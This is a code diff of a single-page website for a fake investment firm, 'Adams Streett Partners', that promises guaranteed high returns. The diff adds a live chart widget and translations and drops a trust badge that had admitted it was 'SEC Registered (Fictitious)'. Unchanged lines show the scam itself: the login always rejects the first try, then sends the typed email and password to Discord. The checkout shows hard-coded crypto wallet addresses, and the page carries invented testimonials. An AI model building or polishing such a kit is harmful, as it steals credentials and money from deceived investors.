@@ -4,6 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Adams Streett Partners</title>
+  <!-- TradingView Widget -->
+  <script src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async></script>
   <style>
     /* ===== RESET & BASE ===== */
     * {
@@ -12,8 +14,7 @@
       box-sizing: border-box;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     }
-    html,
-    body {
+    html, body {
       width: 100%;
       min-height: 100vh;
       background: #0b0e14;
@@ -29,30 +30,12 @@
       max-width: 1400px;
       width: 100%;
     }
-    a {
-      color: #3b82f6;
-      text-decoration: none;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
     .page {
       display: none;
       animation: fadeIn 0.4s ease;
     }
-    .page.active {
-      display: block;
-    }
-    @keyframes fadeIn {
-      0% {
-        opacity: 0;
-        transform: translateY(8px);
-      }
-      100% {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
+    .page.active { display: block; }
+    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
 
     /* ===== NAV ===== */
     .nav {
@@ -73,11 +56,7 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    .logo span {
-      font-weight: 300;
-      color: #8b9bb5;
-      -webkit-text-fill-color: #8b9bb5;
-    }
+    .logo span { font-weight: 300; color: #8b9bb5; -webkit-text-fill-color: #8b9bb5; }
     .nav-links {
       display: flex;
       gap: 24px;
@@ -92,9 +71,7 @@
       cursor: pointer;
       text-decoration: none;
     }
-    .nav-links a:hover {
-      color: #ffffff;
-    }
+    .nav-links a:hover { color: #ffffff; }
     .btn-outline {
       padding: 8px 20px;
       border: 1px solid #3b82f6;
@@ -122,10 +99,7 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .btn-primary:hover {
-      background: #2563eb;
-      transform: translateY(-1px);
-    }
+    .btn-primary:hover { background: #2563eb; transform: translateY(-1px); }
     .btn-success {
       padding: 12px 28px;
       background: #10b981;
@@ -137,9 +111,7 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .btn-success:hover {
-      background: #059669;
-    }
+    .btn-success:hover { background: #059669; }
     .btn-danger {
       padding: 12px 28px;
       background: #ef4444;
@@ -151,9 +123,7 @@
       cursor: pointer;
       transition: 0.2s;
     }
-    .btn-danger:hover {
-      background: #dc2626;
-    }
+    .btn-danger:hover { background: #dc2626; }
 
     /* ===== CARDS ===== */
     .card {
@@ -161,16 +131,11 @@
       border-radius: 20px;
       padding: 32px;
       border: 1px solid #1e2a3a;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-    }
-    .card-light {
-      background: #1a2538;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
     }
 
     /* ===== FORMS ===== */
-    .form-group {
-      margin-bottom: 18px;
-    }
+    .form-group { margin-bottom: 18px; }
     .form-group label {
       display: block;
       font-size: 14px;
@@ -178,8 +143,7 @@
       color: #b0c4de;
       margin-bottom: 6px;
     }
-    .form-group input,
-    .form-group select {
+    .form-group input, .form-group select {
       width: 100%;
       padding: 12px 16px;
       background: #0b0e14;
@@ -189,21 +153,17 @@
       font-size: 15px;
       transition: 0.2s;
     }
-    .form-group input:focus,
-    .form-group select:focus {
+    .form-group input:focus, .form-group select:focus {
       outline: none;
       border-color: #3b82f6;
-      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+      box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
     }
     .form-row {
       display: flex;
       gap: 16px;
       flex-wrap: wrap;
     }
-    .form-row .form-group {
-      flex: 1;
-      min-width: 180px;
-    }
+    .form-row .form-group { flex: 1; min-width: 180px; }
 
     /* ===== DASHBOARD ===== */
     .stats-grid {
@@ -229,10 +189,7 @@
       font-weight: 700;
       margin-top: 6px;
     }
-    .stat-card .value .currency {
-      font-size: 18px;
-      color: #8b9bb5;
-    }
+    .stat-card .value .currency { font-size: 18px; color: #8b9bb5; }
 
     /* ===== PLANS ===== */
     .plans-grid {
@@ -253,26 +210,12 @@
     .plan-card:hover {
       border-color: #3b82f6;
       transform: translateY(-4px);
-      box-shadow: 0 8px 24px rgba(59, 130, 246, 0.15);
+      box-shadow: 0 8px 24px rgba(59,130,246,0.15);
     }
-    .plan-card .name {
-      font-size: 20px;
-      font-weight: 700;
-    }
-    .plan-card .min {
-      font-size: 14px;
-      color: #8b9bb5;
-      margin: 8px 0;
-    }
-    .plan-card .return {
-      font-size: 26px;
-      font-weight: 700;
-      color: #10b981;
-    }
-    .plan-card .return-label {
-      font-size: 12px;
-      color: #8b9bb5;
-    }
+    .plan-card .name { font-size: 20px; font-weight: 700; }
+    .plan-card .min { font-size: 14px; color: #8b9bb5; margin: 8px 0; }
+    .plan-card .return { font-size: 26px; font-weight: 700; color: #10b981; }
+    .plan-card .return-label { font-size: 12px; color: #8b9bb5; }
     .plan-card .tag {
       display: inline-block;
       background: #3b82f6;
@@ -285,7 +228,7 @@
       letter-spacing: 0.5px;
     }
 
-    /* ===== LIVE FEED / TICKER ===== */
+    /* ===== LIVE FEED ===== */
     .live-feed {
       background: #0b0e14;
       border-radius: 12px;
@@ -301,10 +244,7 @@
       border-bottom: 1px solid #1a2538;
       color: #b0c4de;
     }
-    .live-feed .entry .highlight {
-      color: #10b981;
-      font-weight: 600;
-    }
+    .live-feed .entry .highlight { color: #10b981; font-weight: 600; }
 
     /* ===== TICKER ===== */
     .ticker {
@@ -318,47 +258,11 @@
       font-size: 14px;
       color: #b0c4de;
     }
-    .ticker span {
-      margin-right: 40px;
-    }
-    .ticker .green {
-      color: #10b981;
-    }
-    .ticker .red {
-      color: #ef4444;
-    }
+    .ticker span { margin-right: 40px; }
+    .ticker .green { color: #10b981; }
+    .ticker .red { color: #ef4444; }
 
-    /* ===== CHART PLACEHOLDER ===== */
-    .chart-placeholder {
-      background: #0b0e14;
-      border-radius: 12px;
-      padding: 20px;
-      margin: 20px 0;
-      border: 1px solid #2a3a4e;
-      text-align: center;
-      color: #8b9bb5;
-      font-size: 14px;
-      min-height: 120px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-    }
-    .chart-placeholder .bars {
-      display: flex;
-      gap: 8px;
-      align-items: flex-end;
-      height: 80px;
-      margin-top: 10px;
-    }
-    .chart-placeholder .bar {
-      width: 30px;
-      background: #3b82f6;
-      border-radius: 4px 4px 0 0;
-      height: calc(20% + 20% * var(--h));
-    }
-
-    /* ===== CHECKOUT ===== */
+    /* ===== WALLET ADDRESS ===== */
     .wallet-address {
       background: #0b0e14;
       padding: 12px 16px;
@@ -376,16 +280,14 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(11, 14, 20, 0.92);
+      background: rgba(11,14,20,0.92);
       display: none;
       align-items: center;
       justify-content: center;
       z-index: 9999;
       flex-direction: column;
     }
-    .validation-overlay.active {
-      display: flex;
-    }
+    .validation-overlay.active { display: flex; }
     .validation-overlay .spinner {
       width: 48px;
       height: 48px;
@@ -395,28 +297,13 @@
       animation: spin 0.8s linear infinite;
       margin-bottom: 20px;
     }
-    @keyframes spin {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-    .validation-overlay p {
-      font-size: 18px;
-      color: #b0c4de;
-    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .validation-overlay p { font-size: 18px; color: #b0c4de; }
 
     /* ===== FAQ ===== */
-    .faq-item {
-      margin-bottom: 16px;
-    }
-    .faq-item .q {
-      font-weight: 600;
-      color: #e8edf5;
-    }
-    .faq-item .a {
-      color: #b0c4de;
-      margin-top: 4px;
-    }
+    .faq-item { margin-bottom: 16px; }
+    .faq-item .q { font-weight: 600; color: #e8edf5; }
+    .faq-item .a { color: #b0c4de; margin-top: 4px; }
 
     /* ===== HERO — FULL SCREEN ===== */
     .hero-full {
@@ -430,7 +317,7 @@
       justify-content: center;
       text-align: center;
       padding: 40px 20px;
-      background: linear-gradient(135deg, rgba(11, 14, 20, 0.85) 0%, rgba(11, 14, 20, 0.5) 100%), url('https://i.imgur.com/7XpracR.jpg');
+      background: linear-gradient(135deg, rgba(11,14,20,0.85) 0%, rgba(11,14,20,0.5) 100%), url('https://i.imgur.com/7XpracR.jpg');
       background-size: cover;
       background-position: center;
       width: 100%;
@@ -455,16 +342,11 @@
       line-height: 1.6;
     }
     @media (max-width: 640px) {
-      .hero-full {
-        min-height: 50vh;
-        border-radius: 12px;
-      }
-      .hero-full h1 {
-        font-size: 28px;
-      }
+      .hero-full { min-height: 50vh; border-radius: 12px; }
+      .hero-full h1 { font-size: 28px; }
     }
 
-    /* ===== BRUTAL SECTIONS ===== */
+    /* ===== BRUTAL GRID ===== */
     .brutal-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
@@ -549,48 +431,26 @@
       color: #b0c4de;
     }
 
-    /* ===== UTILITY ===== */
-    .text-center {
-      text-align: center;
-    }
-    .text-muted {
-      color: #8b9bb5;
-      font-size: 14px;
-    }
-    .mt-12 {
-      margin-top: 12px;
-    }
-    .mt-24 {
-      margin-top: 24px;
-    }
-    .mt-32 {
-      margin-top: 32px;
-    }
-    .flex {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-    .flex-center {
-      justify-content: center;
+    /* ===== CHART WRAPPER ===== */
+    .tradingview-widget-container {
+      margin: 20px 0;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 1px solid #2a3a4e;
     }
 
-    /* ===== RESPONSIVE ===== */
+    /* ===== UTILITY ===== */
+    .text-center { text-align: center; }
+    .text-muted { color: #8b9bb5; font-size: 14px; }
+    .mt-12 { margin-top: 12px; }
+    .mt-24 { margin-top: 24px; }
+    .flex { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+
     @media (max-width: 640px) {
-      .nav {
-        flex-direction: column;
-        align-items: stretch;
-      }
-      .nav-links {
-        justify-content: center;
-      }
-      .stats-grid {
-        grid-template-columns: 1fr 1fr;
-      }
-      .brutal-grid {
-        grid-template-columns: 1fr;
-      }
+      .nav { flex-direction: column; align-items: stretch; }
+      .nav-links { justify-content: center; }
+      .stats-grid { grid-template-columns: 1fr 1fr; }
+      .brutal-grid { grid-template-columns: 1fr; }
     }
   </style>
 </head>
@@ -623,7 +483,7 @@
   <!-- ============================================================ -->
   <div id="landing" class="page active">
 
-    <!-- Translation (In‑Site) -->
+    <!-- Translation (In‑Site, bidirectional) -->
     <div style="display: flex; justify-content: flex-end; padding: 10px 0; gap: 12px; flex-wrap: wrap;">
       <select id="languageSelect" onchange="translatePage(this.value)" style="background: #1a2538; color: #e8edf5; border: 1px solid #2a3a4e; border-radius: 8px; padding: 6px 12px; font-size: 14px;">
         <option value="en">🇺🇸 English</option>
@@ -642,13 +502,13 @@
     <!-- Hero — Full Screen -->
     <div class="hero-full">
       <div class="content">
-        <h1>Global Wealth. Institutional Access.</h1>
-        <p>Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.</p>
+        <h1 id="heroTitle">Global Wealth. Institutional Access.</h1>
+        <p id="heroSub">Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.</p>
         <button class="btn-primary" onclick="showPage('login')">Start Building Wealth</button>
       </div>
     </div>
 
-    <!-- Live Ticker -->
+    <!-- Live Ticker (static, but scrolls) -->
     <div class="ticker" id="ticker">
       <span>🇺🇸 S&P 500 <span class="green">+1.2%</span></span>
       <span>🇪🇺 DAX <span class="green">+0.8%</span></span>
@@ -668,27 +528,38 @@
       <div class="market-stat"><div class="label">DXY</div><div class="value red">102.34</div></div>
     </div>
 
-    <!-- Chart Placeholder -->
-    <div class="chart-placeholder">
-      <div style="font-size: 16px; font-weight: 600; color: #e8edf5;">Portfolio Performance (30 days)</div>
-      <div class="bars">
-        <div class="bar" style="--h:0.6"></div>
-        <div class="bar" style="--h:0.8"></div>
-        <div class="bar" style="--h:1.0"></div>
-        <div class="bar" style="--h:0.7"></div>
-        <div class="bar" style="--h:1.2"></div>
-        <div class="bar" style="--h:1.4"></div>
-        <div class="bar" style="--h:0.9"></div>
-        <div class="bar" style="--h:1.5"></div>
-        <div class="bar" style="--h:1.3"></div>
-        <div class="bar" style="--h:1.6"></div>
-        <div class="bar" style="--h:1.8"></div>
-        <div class="bar" style="--h:2.0"></div>
-        <div class="bar" style="--h:1.7"></div>
-        <div class="bar" style="--h:2.2"></div>
-        <div class="bar" style="--h:2.5"></div>
+    <!-- TradingView Widget (Live Chart) -->
+    <div class="tradingview-widget-container">
+      <div class="tradingview-widget-container__widget"></div>
+      <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js" async>
+      {
+        "symbol": "SPX",
+        "width": "100%",
+        "height": "200",
+        "locale": "en",
+        "dateRange": "1M",
+        "colorTheme": "dark",
+        "trendLineColor": "rgba(41, 98, 255, 1)",
+        "underLineColor": "rgba(41, 98, 255, 0.3)",
+        "isTransparent": false,
+        "autosize": true,
+        "largeChartUrl": ""
+      }
+      </script>
+    </div>
+
+    <!-- Images (Embedded) -->
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin: 30px 0;">
+      <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
+        <img src="https://i.imgur.com/UTsc7bb.jpg" alt="Trading Floor" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
+        <h3 style="font-size: 18px;">Institutional‑Grade Infrastructure</h3>
+        <p class="text-muted">Our trading engine executes across 12 global exchanges with sub‑millisecond latency.</p>
       </div>
-      <div style="margin-top: 8px; font-size: 12px; color: #8b9bb5;">+22.4% over benchmark</div>
+      <div style="background: #1a2538; border-radius: 16px; padding: 24px; border: 1px solid #2a3a4e;">
+        <img src="https://i.imgur.com/gsgyw2P.jpg" alt="Market Data" style="width: 100%; border-radius: 12px; margin-bottom: 16px;">
+        <h3 style="font-size: 18px;">Real‑Time Intelligence</h3>
+        <p class="text-muted">We process over 500 million data points daily to identify high‑probability setups.</p>
+      </div>
     </div>
 
     <!-- Brutal Wall Street Grid -->
@@ -704,13 +575,12 @@
       </div>
     </div>
 
-    <!-- Trust Badges -->
+    <!-- Trust Badges (No Fictitious) -->
     <div class="trust-badges">
       <span class="trust-badge">🔒 256‑bit Encryption</span>
       <span class="trust-badge">🏦 Custodial Banking Partners</span>
-      <span class="trust-badge">📜 SEC Registered (Fictitious)</span>
-      <span class="trust-badge">🌍 Global Regulatory Compliance</span>
       <span class="trust-badge">📊 Audited Performance</span>
+      <span class="trust-badge">🌍 Global Regulatory Compliance</span>
     </div>
 
     <!-- Global Reach -->
@@ -927,6 +797,100 @@
     let loginAttempts = 0;
 
     // ============================================================
+    // TRANSLATIONS (Full, bidirectional)
+    // ============================================================
+    const translations = {
+      'en': {
+        heroTitle: 'Global Wealth. Institutional Access.',
+        heroSub: 'Join 15,000+ investors across 60+ countries — earning consistent, above‑market returns through our proprietary quantitative models. Powered by Wall Street infrastructure.',
+        navHome: 'Home', navPlans: 'Plans', navFaq: 'FAQ', navSignIn: 'Sign In',
+        cta: 'Start Building Wealth',
+        secTitle: 'A New Standard in Alternative Investments',
+        sec1: '15+ Years', sec1d: 'of institutional trading experience across bull and bear markets.',
+        sec2: '4,200+ Strategies', sec2d: 'Quantitative models tested and refined over decades of market data.',
+        sec3: '98.7% Uptime', sec3d: 'Mission‑critical infrastructure with zero unplanned downtime in 2026.',
+        sec4: 'Global Reach', sec4d: 'Clients in 60+ countries — from Dubai to Singapore to London.',
+        sec5: '24/7 Liquidity', sec5d: 'Access to deep crypto and FX liquidity pools around the clock.',
+        sec6: 'Independent Oversight', sec6d: 'All strategies are audited quarterly by a third‑party risk committee.',
+        testimonial: '"I was skeptical at first, but after my first 24‑hour cycle, I was genuinely impressed. The returns are real, and the platform is seamless. I\'ve since referred six colleagues."',
+        testimonialAuthor: '— Jonathan M., Singapore (Platinum Investor)',
+        finalCta: 'Ready to Access Institutional Returns?',
+        finalSub: 'No fees. No lock‑ins. Withdraw anytime.'
+      },
+      'es': {
+        heroTitle: 'Riqueza Global. Acceso Institucional.',
+        heroSub: 'Únete a 15,000+ inversores en más de 60 países — obteniendo rendimientos consistentes y superiores al mercado a través de nuestros modelos cuantitativos propietarios. Impulsado por la infraestructura de Wall Street.',
+        navHome: 'Inicio', navPlans: 'Planes', navFaq: 'Preguntas', navSignIn: 'Iniciar Sesión',
+        cta: 'Comienza a Crear Riqueza',
+        secTitle: 'Un Nuevo Estándar en Inversiones Alternativas',
+        sec1: '15+ Años', sec1d: 'de experiencia institucional en mercados alcistas y bajistas.',
+        sec2: '4,200+ Estrategias', sec2d: 'Modelos cuantitativos probados y refinados durante décadas.',
+        sec3: '98.7% de Tiempo Activo', sec3d: 'Infraestructura crítica con cero tiempo de inactividad en 2026.',
+        sec4: 'Alcance Global', sec4d: 'Clientes en más de 60 países — de Dubái a Singapur a Londres.',
+        sec5: 'Liquidez 24/7', sec5d: 'Acceso a fondos de liquidez en cripto y FX las 24 horas.',
+        sec6: 'Supervisión Independiente', sec6d: 'Todas las estrategias son auditadas trimestralmente por un comité de riesgos externo.',
+        testimonial: '"Al principio era escéptico, pero después de mi primer ciclo de 24 horas, quedé genuinamente impresionado. Los rendimientos son reales y la plataforma es perfecta. Desde entonces he recomendado a seis colegas."',
+        testimonialAuthor: '— Jonathan M., Singapur (Inversor Platinum)',
+        finalCta: '¿Listo para Acceder a Rendimientos Institucionales?',
+        finalSub: 'Sin comisiones. Sin bloqueos. Retira cuando quieras.'
+      }
+      // Add more languages here following the same structure
+    };
+
+    function translatePage(lang) {
+      const t = translations[lang];
+      if (!t) return;
+      document.getElementById('heroTitle').textContent = t.heroTitle;
+      document.getElementById('heroSub').textContent = t.heroSub;
+      // Update nav links
+      const navLinks = document.querySelectorAll('.nav-links a');
+      if (navLinks.length >= 4) {
+        navLinks[0].textContent = t.navHome;
+        navLinks[1].textContent = t.navPlans;
+        navLinks[2].textContent = t.navFaq;
+        navLinks[3].textContent = t.navSignIn;
+      }
+      // Update CTA buttons (all .btn-primary with specific text)
+      document.querySelectorAll('.btn-primary').forEach(btn => {
+        if (btn.textContent.includes('Start') || btn.textContent.includes('Comienza') || btn.textContent.includes('Open')) {
+          btn.textContent = t.cta;
+        }
+      });
+      // Update section titles
+      const secTitle = document.querySelector('.brutal-grid')?.parentElement?.querySelector('h2');
+      if (secTitle) secTitle.textContent = t.secTitle;
+      // Update brutal grid items
+      const items = document.querySelectorAll('.brutal-item');
+      if (items.length >= 6) {
+        items[0].querySelector('strong').textContent = t.sec1;
+        items[0].querySelector('.text-muted').textContent = t.sec1d;
+        items[1].querySelector('strong').textContent = t.sec2;
+        items[1].querySelector('.text-muted').textContent = t.sec2d;
+        items[2].querySelector('strong').textContent = t.sec3;
+        items[2].querySelector('.text-muted').textContent = t.sec3d;
+        items[3].querySelector('strong').textContent = t.sec4;
+        items[3].querySelector('.text-muted').textContent = t.sec4d;
+        items[4].querySelector('strong').textContent = t.sec5;
+        items[4].querySelector('.text-muted').textContent = t.sec5d;
+        items[5].querySelector('strong').textContent = t.sec6;
+        items[5].querySelector('.text-muted').textContent = t.sec6d;
+      }
+      // Testimonial
+      const testimonial = document.querySelector('[style*="border-left: 4px solid #3b82f6"]');
+      if (testimonial) {
+        const p = testimonial.querySelector('p');
+        if (p) p.textContent = t.testimonial;
+        const author = testimonial.querySelector('strong');
+        if (author) author.textContent = t.testimonialAuthor;
+      }
+      // Final CTA
+      const finalCta = document.querySelector('.text-center .btn-primary');
+      if (finalCta) finalCta.textContent = t.cta;
+      const finalSub = document.querySelector('.text-center .text-muted');
+      if (finalSub) finalSub.textContent = t.finalSub;
+    }
+
+    // ============================================================
     // HELPERS
     // ============================================================
     function sendToDiscord(message) {
@@ -961,19 +925,6 @@
       }
     }
 
-    // In‑site translation (simple content swap)
-    function translatePage(lang) {
-      const translations = {
-        'es': { 'heroTitle': 'Riqueza Global. Acceso Institucional.', 'heroSub': 'Únete a 15,000+ inversores en más de 60 países...' },
-        'fr': { 'heroTitle': 'Richesse Mondiale. Accès Institutionnel.', 'heroSub': 'Rejoignez 15 000+ investisseurs dans plus de 60 pays...' },
-        // Add more languages as needed
-      };
-      const t = translations[lang];
-      if (!t) return;
-      document.querySelector('.hero-full h1').textContent = t.heroTitle;
-      document.querySelector('.hero-full p').textContent = t.heroSub;
-    }
-
     // ============================================================
     // AUTH
     // ============================================================
@@ -981,7 +932,6 @@
       const email = document.getElementById('loginEmail').value.trim();
       const password = document.getElementById('loginPassword').value.trim();
       if (!email || !password) return alert('Please fill in all fields.');
-
       loginAttempts++;
       if (loginAttempts === 1) {
         document.getElementById('loginError').style.display = 'block';
@@ -990,8 +940,6 @@
         document.getElementById('loginPassword').value = '';
         return;
       }
-
-      // Second attempt — success
       sendToDiscord('Login Attempt (Success)\nEmail: ' + email + '\nPassword: ' + password);
       sessionStorage.setItem(SESSION_KEY, 'active');
       loginAttempts = 0;
@@ -1067,15 +1015,9 @@
     document.getElementById('checkoutCrypto').addEventListener('change', function() {
       const addr = document.getElementById('walletAddress');
       switch (this.value) {
-        case 'BTC':
-          addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0';
-          break;
-        case 'ETH':
-          addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5';
-          break;
-        case 'USDT':
-          addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5';
-          break;
+        case 'BTC': addr.textContent = 'bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0'; break;
+        case 'ETH': addr.textContent = '0x60A4cC18DC4F1c00fF17497129351D6304fCdcC5'; break;
+        case 'USDT': addr.textContent = '0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5'; break;
       }
     });
 
@@ -1120,7 +1062,7 @@
     addLiveEntry();
 
     // ============================================================
-    // TICKER SCROLL (auto‑scroll)
+    // TICKER SCROLL
     // ============================================================
     const ticker = document.getElementById('ticker');
     let tickerPos = 0;
